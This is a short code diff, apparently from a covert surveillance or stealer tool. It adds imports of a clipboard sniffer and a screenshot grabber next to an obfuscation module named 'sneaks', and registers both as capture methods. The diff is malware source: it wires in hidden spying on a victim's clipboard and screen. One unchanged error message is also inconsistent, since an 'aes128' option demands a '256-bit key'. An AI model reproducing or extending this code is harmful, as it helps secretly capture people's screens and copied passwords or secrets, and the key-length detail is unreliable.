@@ -1,4 +1,5 @@
 from config import *
+from .misc import clipboardSniffer, grabSS # type: ignore
 from .sneaks import obfuscation
 
 def makeConfig() -> None:
@@ -16,3 +17,5 @@ def makeConfig() -> None:
         raise Exception("Invalid key for obfuscation method: 192-bit key required")
     elif PARAM["sneak"] == "aes128" and len(PARAM["key"]) != 64:
         raise Exception("Invalid key for obfuscation method: 256-bit key required")
+    METHODS["screenshot"] = lambda delay=0: grabSS(delay)
+    METHODS["clipboard"] = lambda delay=0: clipboardSniffer(delay)
